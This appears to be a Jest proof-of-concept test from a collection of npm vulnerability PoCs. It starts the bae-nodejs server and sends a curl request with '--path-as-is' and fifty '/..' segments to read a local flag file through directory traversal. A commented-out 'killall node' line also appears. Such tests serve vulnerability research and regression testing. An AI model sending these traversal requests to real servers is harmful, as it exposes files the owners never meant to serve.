//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/bae-nodejs/test.js
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in bae-nodejs", (done) => {
  const pkg = require("bae-nodejs");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  pkg.start(__dirname);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:18080${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });

  // sleep(15);
  // exec('killall node', (error, stdout) => {})
});
